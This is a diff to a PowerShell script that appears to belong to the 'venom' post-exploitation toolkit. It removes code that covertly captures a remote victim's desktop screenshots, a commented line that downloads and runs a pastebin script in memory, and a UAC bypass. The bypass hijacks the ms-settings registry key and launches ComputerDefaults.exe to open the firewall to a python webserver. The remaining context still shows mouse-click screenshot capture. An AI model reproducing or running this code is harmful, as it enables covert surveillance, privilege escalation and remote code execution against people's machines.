@@ -60,11 +60,6 @@
    'Its the syntax that gives us more guarantees of success'.
 
 .EXAMPLE
-   PS C:\> .\webserver.ps1 -SRec 5 -SRDelay 2
-   Capture 5 desktop screenshots with 2 seconds of delay
-   between each capture. before executing the @webserver.
-
-.EXAMPLE
    PS C:\> .\webserver.ps1 -SPsr 8
    Capture Screenshots of MouseClicks for 8 seconds
    And store the capture under '$Env:TMP' remote directory
@@ -454,51 +449,6 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
 }
 
 
-If($SRec -gt 0){
-$Limmit = $SRec+1 ## The number of screenshots to be taken
-If($SRDelay -lt '1'){$SRDelay = '1'} ## Screenshots delay time minimum value accepted
-
-   <#
-   .SYNOPSIS
-      Capture remote desktop screenshot(s)
-
-   .DESCRIPTION
-      [<-SRec>] Parameter allow us to take desktop screenshots before
-      continue with @webserver execution. The value set in [<-SRec>] parameter
-      serve to count how many screenshots we want to capture before continue.
-
-   .EXAMPLE
-      PS C:\> .\webserver.ps1 -SRec 5 -SRDelay 2
-      Capture 5 desktop screenshots with 2 seconds of delay
-      between each capture. before executing the @webserver.
-   #>
-
-   ## Loop Function to take more than one screenshot.
-   For ($num = 1 ; $num -le $SRec ; $num++){
-      write-host "Screenshot $num" -ForeGroundColor Yellow
-
-      $OutPutPath = "$Env:TMP"
-      $Dep = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 5 |%{[char]$_})
-      $FileName = "$Env:TMP\SHot-"+"$Dep.png"
-      If(-not(Test-Path "$OutPutPath")){New-Item $OutPutPath -ItemType Directory -Force}
-      Add-Type -AssemblyName System.Windows.Forms
-      Add-type -AssemblyName System.Drawing
-      $ASLR = [System.Windows.Forms.SystemInformation]::VirtualScreen
-      $Height = $ASLR.Height;$Width = $ASLR.Width
-      $Top = $ASLR.Top;$Left = $ASLR.Left
-      $Console = New-Object System.Drawing.Bitmap $Width, $Height
-      $AMD = [System.Drawing.Graphics]::FromImage($Console)
-      $AMD.CopyFromScreen($Left, $Top, 0, 0, $Console.Size)
-      $Console.Save($FileName) 
-      Write-Host "Saved to: $FileName"
-
-      #iex(iwr("https://pastebin.com/raw/bqddWQcy")); ## Script.ps1 (pastebin) FileLess execution ..
-      Start-Sleep -Seconds $SRDelay; ## 2 seconds delay between screenshots (default value)
-   }
-   Write-Host ""
-}
-
-
 If($SPsr -gt 0){
 ## Random FileName generation
 $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
@@ -779,29 +729,6 @@ If(-not($Installation) -or $Installation -ieq $null){
          $PythonPath = "$SearchPath"+"\python.exe"
       }Else{
          $PythonPath = $SearchPath|Where {$_ -ne ''}
-      }
-   }
-
-   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544");
-   If($IsClientAdmin){# Check if rule allready exists on remote firewall
-      netsh advfirewall firewall show rule name="python.exe"|Out-Null
-      If(-not($LASTEXITCODE -eq 0)){
-         write-host "[bypass] Adding python.exe firewall rule." -ForeGroundColor Yellow
-         netsh advfirewall firewall add rule name="python.exe" description="venom v1.0.17 - python (SE) webserver" program="$PythonPath" dir=in action=allow protocol=TCP enable=yes|Out-Null
-      }
-   }Else{
-      ## Shell (webserver) running under UserLand privs
-      # Check if rule allready exists on remote firewall
-      netsh advfirewall firewall show rule name="python.exe"|Out-Null
-      If(-not($LASTEXITCODE -eq 0)){# Use ComputerDefaults EOP to add rule to remote firewall
-         write-host "[bypass] Using EOP technic to add firewall rule." -ForeGroundColor Yellow
-         $Command = "netsh advfirewall firewall add rule name=`"python.exe`" description=`"venom v1.0.17 - python (SE) webserver`" program=`"$PythonPath`" dir=in action=allow protocol=TCP enable=yes"
-         ## Adding to remote regedit the 'ComputerDefaults' hijacking keys (EOP - UAC Bypass - UserLand)
-         New-Item "HKCU:\Software\Classes\ms-settings\shell\open\Command" -Force -EA SilentlyContinue|Out-Null
-         Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value '' -Force|Out-Null
-         Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "$Command" -Force|Out-Null
-         Start-Process -WindowStyle hidden "$Env:WINDIR\System32\ComputerDefaults.exe" -Wait
-         Remove-Item "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force|Out-Null
       }
    }
 
